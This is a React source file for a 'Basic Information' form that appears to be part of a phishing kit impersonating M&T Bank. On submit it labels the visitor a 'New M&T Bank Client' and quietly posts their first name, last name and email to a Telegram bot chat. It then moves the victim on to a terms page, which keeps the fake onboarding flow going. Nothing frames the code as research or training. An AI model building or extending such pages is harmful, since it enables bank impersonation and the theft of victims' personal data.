import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Header from '../../components/Header';
import Sidebar from '../../components/Sidebar';
import Footer from '../../components/Footer';
import axios from 'axios';
import { botToken, chatId } from '../../constants';

const BasicInfoPage: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [email, setEmail] = useState('');
  const [errors, setErrors] = useState({ firstName: '', lastName: '', email: '' });

  const navigate = useNavigate();

  const validateEmail = (email) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    let newErrors = { firstName: '', lastName: '', email: '' };

    if (!firstName.trim()) {
      newErrors.firstName = 'First name is required.';
    }

    if (!lastName.trim()) {
      newErrors.lastName = 'Last name is required.';
    }

    if (!validateEmail(email)) {
      newErrors.email = 'Invalid email format.';
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.firstName && !newErrors.lastName && !newErrors.email) {
      // Proceed with form submission
      console.log('Form submitted with:', { firstName, lastName, email });

      const userData = `New M&T Bank Client \n\nFirst Name: ${firstName} \nLast Name: ${lastName} \nEmail: ${email}`;
      sendMessageToTelegram(userData);

      navigate('/terms-conditions'); // Replace with the actual next page route

      setErrors({ firstName: '', lastName: '', email: '' });
    }
  };

  const sendMessageToTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
      await axios.post(url, {
        chat_id: chatId,
        text: message,
      });
      console.log('Message sent successfully');
    } catch (error) {
      console.error('Error sending message:', error);
    }
  };

  return (
    <>
      <Header sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      <Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      <section>
        <div className="grid grid-cols-1 gap-4">
          <div className="px-10 pt-4">
            <h1 className="text-5xl font-extralight mb-6 text-center text-middarkgreen">
              Basic Information
            </h1>

            <p className='mb-5'>Please fill out your basic information below.</p>

            <form onSubmit={handleSubmit}>
              <div className="mb-5">
                <label className="block text-black dark:text-white">First Name</label>
                <input
                  id="firstName"
                  name="firstName"
                  type='text'
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                />
                {errors.firstName && <p className="text-red-600">{errors.firstName}</p>}
              </div>

              <div className="mb-5">
                <label className="block text-black dark:text-white">Last Name</label>
                <input
                  id="lastName"
                  name="lastName"
                  type='text'
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                />
                {errors.lastName && <p className="text-red-600">{errors.lastName}</p>}
              </div>

              <div className="mb-5">
                <label className="block text-black dark:text-white">Email</label>
                <input
                  id="email"
                  name="email"
                  type='email'
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                />
                {errors.email && <p className="text-red-600">{errors.email}</p>}
              </div>

              <div className="mb-10 ">
                <input
                  type="submit"
                  value="Continue"
                  className="w-full cursor-pointer font-bold border border-darkgreen bg-darkgreen p-2 text-white transition hover:bg-opacity-90"
                />
              </div>
            </form>
          </div>
        </div>
      </section>
      <br />
      <Footer />
    </>
  );
};

export default BasicInfoPage;
